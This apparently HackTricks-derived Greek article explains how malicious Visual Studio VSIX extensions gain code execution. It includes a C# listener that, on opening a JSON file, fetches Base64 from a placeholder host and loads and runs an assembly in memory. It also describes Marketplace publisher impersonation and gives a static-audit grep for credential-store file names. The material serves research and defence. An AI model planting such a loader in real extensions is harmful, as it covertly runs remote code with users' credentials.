# Κατάχρηση επέκτασης VSIX του Visual Studio

{{#include ../banners/hacktricks-training.md}}

Μια επέκταση του Visual Studio μπορεί να μετατρέψει τη συνηθισμένη δραστηριότητα στον επεξεργαστή σε εκτέλεση κώδικα με την ταυτότητα του συνδεδεμένου χρήστη. Ένα κακόβουλο VSIX, ένας εκδότης που μιμείται κάποιον άλλον ή μια παραβιασμένη ενημέρωση επέκτασης μπορούν να προσεγγίσουν αυτόν τον χρήστη μέσω των συνήθων καναλιών εγκατάστασης. Η εγκατάσταση με προτροπή διαχειριστή είναι μια διαδρομή εγκατάστασης με συγκατάθεση, όχι αυτόματη κλιμάκωση προνομίων.<sup>[[1]](#references)</sup>

## Μοντέλο εκτέλεσης

Οι κλασικές επεκτάσεις VSSDK εκτελούνται συνήθως μέσα στο `devenv.exe`. Το νεότερο μοντέλο `VisualStudio.Extensibility` εκτελεί κυρίως τις σύγχρονες επεκτάσεις .NET εκτός διεργασίας: το Visual Studio μεσολαβεί στις κλήσεις προς μια αποκλειστική διεργασία `Microsoft.ServiceHub.Host.Extensibility`, απομονώνοντας τη σταθερότητα του IDE, αλλά **όχι** περιορίζοντας την επέκταση σε sandbox από τα δικαιώματα του χρήστη στα Windows. Το ακριβές όνομα του εκτελέσιμου αρχείου μπορεί να περιλαμβάνει επίθημα αρχιτεκτονικής, όπως `ServiceHub.Host.Extensibility.arm64.exe`.<sup>[[1]](#references)[[2]](#references)</sup>

### Ενεργοποίηση κατά τη συνηθισμένη δραστηριότητα στον επεξεργαστή

Αντί να εκθέτει μόνο μια εμφανή εντολή μενού, μια επέκταση μπορεί να υλοποιήσει το `ITextViewOpenClosedListener`. Η callback `TextViewOpenedAsync` καλείται για έγγραφα που πληρούν τα κριτήρια, ενώ το `TextViewExtensionConfiguration.AppliesTo` μπορεί να περιορίσει την ενεργοποίηση σε έναν συνήθη τύπο, όπως το JSON. Ένας πραγματικός formatter ή linter μπορεί να συνεχίσει να εκτελεί την εργασία που διαφημίζει, ενώ μια δεύτερη ενέργεια εκτελείται ως παρενέργεια του ανοίγματος ενός αρχείου.<sup>[[1]](#references)[[3]](#references)</sup>

Το παρακάτω απλοποιημένο παράδειγμα δείχνει τα σημαντικά σημεία εκτέλεσης· για λόγους σαφήνειας παραλείπει τον νόμιμο formatter και τον χειρισμό σφαλμάτων.<sup>[[1]](#references)[[3]](#references)</sup>

<details>
<summary>Φορτωτής διαχειριζόμενης assembly στη μνήμη, με ενεργοποίηση από συμβάν</summary>

```csharp
[VisualStudioContribution]
internal class JsonListener : ExtensionPart, ITextViewOpenClosedListener
{
    public TextViewExtensionConfiguration TextViewExtensionConfiguration => new()
    {
        AppliesTo = [DocumentFilter.FromDocumentType("json")]
    };

    public async Task TextViewOpenedAsync(ITextViewSnapshot view, CancellationToken ct)
    {
        using var http = new HttpClient();
        var encoded = (await http.GetStringAsync("https://example.invalid/update.txt", ct)).Trim();
        using var stream = new MemoryStream(Convert.FromBase64String(encoded));
        var context = new AssemblyLoadContext(Guid.NewGuid().ToString(), isCollectible: true);
        var entry = context.LoadFromStream(stream).EntryPoint
            ?? throw new InvalidOperationException("Assembly has no entry point");
        var argv = entry.GetParameters().Length == 0 ? null : new object?[] { Array.Empty<string>() };
        if (entry.Invoke(null, argv) is Task task) await task;
        context.Unload();
    }

    public Task TextViewClosedAsync(ITextViewSnapshot view, CancellationToken ct)
        => Task.CompletedTask;
}
```

</details>

Αυτή η αλυσίδα κατεβάζει κείμενο Base64, το αποκωδικοποιεί σε bytes assembly, το φορτώνει από ένα `MemoryStream` μέσω ενός συλλέξιμου `AssemblyLoadContext`, καλεί το ανακλώμενο `EntryPoint` χωρίς παραμέτρους ή με ένα `string[]`, περιμένει την ολοκλήρωση των ασύγχρονων entry points και αποφορτώνει το context. Το δεύτερο στάδιο δεν εγγράφεται στον δίσκο, αν και το VSIX και το κύριο DLL της επέκτασης παραμένουν τεχνουργήματα στον δίσκο. Το Base64 δεν παρέχει αυθεντικότητα ή εμπιστευτικότητα· η χρήση HTTP επιτρέπει επίσης σε έναν επιτιθέμενο που παρεμβάλλεται στη διαδρομή να αντικαταστήσει την απόκριση.<sup>[[1]](#references)</sup>

Οι λειτουργικές παραλλαγές περιλαμβάνουν την καταστολή όλων των εξαιρέσεων, ώστε η διαφημιζόμενη λειτουργία να συνεχίζεται όταν αποτυγχάνει το staging, ή τη χρήση του `ITextViewChangedListener` για ενεργοποίηση μετά από επεξεργασίες. Ο κώδικας εκτελείται στο extension host και μπορεί να χρησιμοποιήσει managed APIs, P/Invoke, αρχεία, διαπιστευτήρια και θυγατρικές διεργασίες που είναι διαθέσιμα στον συγκεκριμένο χρήστη.<sup>[[1]](#references)</sup>

Για μια σχετική επιφάνεια εκτέλεσης ειδική για editor, η οποία βασίζεται σε αυτόματη φόρτωση εγγενών plugin, δείτε:

{{#ref}}
windows-local-privilege-escalation/notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Κατάχρηση εμπιστοσύνης στο Marketplace και στη διανομή

Ένα VSIX μπορεί να διανεμηθεί ως αρχείο που κοινοποιείται απευθείας ή μέσω phishing, από το web Marketplace ή μέσω του ενσωματωμένου προγράμματος περιήγησης Marketplace του Visual Studio. Η εγγραφή εκδότη, η οποία επιβάλλει κυρίως μοναδικότητα και μια λίστα δεσμευμένων λέξεων, μπορεί να επιτρέψει ταυτότητες εκδοτών που μοιάζουν οπτικά παραπλανητικές· η παραβίαση ενός ήδη έμπιστου εκδότη ή επέκτασης είναι ακόμη πιο αποτελεσματική, επειδή αξιοποιεί μια ήδη εγκατεστημένη βάση χρηστών. Η εγκατάσταση από το Marketplace καλεί το Visual Studio Installer και τοποθετεί προσωρινά το ληφθέν VSIX στον κατάλογο `%LOCALAPPDATA%\Temp`· το `payload.vsix` χρησιμοποιείται επίσης νόμιμα, επομένως το όνομα αρχείου από μόνο του δεν αποτελεί ένδειξη.<sup>[[1]](#references)</sup>

Η MDSec δεν εντόπισε πρωτόκολλο URL του Visual Studio που να εγκαθιστά απευθείας μια επέκταση. Ο operator εξακολουθεί να χρειάζεται ο χρήστης να εγκαταστήσει ή να εμπιστευτεί το VSIX, ή πρέπει να παραβιάσει την οδό διανομής μιας υπάρχουσας επέκτασης. Ένα πακέτο `AllUsers` εγκαθίσταται στον φάκελο εγκατάστασης του Visual Studio και μπορεί να ζητήσει ανύψωση δικαιωμάτων, αλλά αυτό είναι φυσιολογική συμπεριφορά εγκατάστασης με συγκατάθεση, όχι αυτόματη οδός προς δικαιώματα administrator ή SYSTEM.<sup>[[1]](#references)[[4]](#references)</sup>

### Στατικός έλεγχος σε μεγάλη κλίμακα

Τα πακέτα VSIX είναι συνήθως αρχεία ZIP, επομένως μια ασφαλής ροή εργασίας ελέγχου του Marketplace μπορεί να απαριθμήσει τα πακέτα, να τα αποσυμπιέσει **χωρίς να φορτώσει τον κώδικα των επεκτάσεων**, να αναλύσει τα manifests, να εντοπίσει τις επιφάνειες εκτέλεσης και να απομεταγλωττίσει τα managed assemblies με το `ilspycmd`. Δώστε προτεραιότητα στα assemblies που ανήκουν στην επέκταση, αφού εξαιρέσετε τις συνήθεις ενσωματωμένες εξαρτήσεις, και στη συνέχεια συσχετίστε συμβολοσειρές αποθήκευσης διαπιστευτηρίων με συμπεριφορικά μοτίβα όπως ανάγνωση αρχείων και αποστολή μέσω δικτύου, κωδικοποίηση και αποστολή, λήψη και εκτέλεση, πρόσβαση στο Credential Manager και στο δίκτυο, ή λήψη και αποστολή στιγμιότυπων οθόνης.<sup>[[1]](#references)[[5]](#references)</sup>

```bash
unzip -q sample.vsix -d sample-vsix
find sample-vsix -type f \( -iname '*.dll' -o -iname '*.exe' \) -print
ilspycmd -p -o decompiled sample-vsix/path/to/extension.dll
rg -n -i 'Login Data|logins\.json|key4\.db|wallet\.dat|\.aws[/\\]credentials|LoadFromStream|EntryPoint|cmd\.exe' decompiled
```

Επίσης, καταγράψτε τις native DLLs, τα MSBuild targets, τα scripts, τα T4 templates και τα payloads εγκατάστασης, αντί να υποθέτετε ότι κάθε επιφάνεια εκτέλεσης αποτελείται από managed code. Συγκρίνετε την ύποπτη συμπεριφορά με τον δηλωμένο σκοπό στο manifest· η τηλεμετρία και οι νόμιμοι updaters μπορεί να μοιάζουν με exfiltration ή staging. Η αποκλειστικά στατική εξέταση δεν εντοπίζει packed, obfuscated, dynamically resolved και dormant κώδικα, ενώ η εξέταση μόνο της πιο πρόσφατης έκδοσης παραβλέπει κακόβουλες παλαιότερες εκδόσεις.<sup>[[1]](#references)</sup>

## References

- [1] [MDSec - Οι επεκτάσεις του Visual Studio ξανά στο προσκήνιο](https://www.mdsec.co.uk/2026/05/visual-studio-extensions-revisited/)
- [2] [Microsoft Learn - Σχετικά με το VisualStudio.Extensibility](https://learn.microsoft.com/en-us/visualstudio/extensibility/visualstudio.extensibility/visualstudio-extensibility?view=visualstudio)
- [3] [Microsoft Learn - ITextViewOpenClosedListener.TextViewOpenedAsync](https://learn.microsoft.com/en-us/dotnet/api/microsoft.visualstudio.extensibility.editor.itextviewopenclosedlistener.textviewopenedasync?view=vs-extensibility)
- [4] [Microsoft Learn - Δομή ενός πακέτου VSIX](https://learn.microsoft.com/en-us/visualstudio/extensibility/anatomy-of-a-vsix-package?view=visualstudio)
- [5] [ILSpy - εργαλείο .NET ilspycmd](https://github.com/icsharpcode/ILSpy/blob/master/ICSharpCode.ILSpyCmd/README.md)
{{#include ../banners/hacktricks-training.md}}
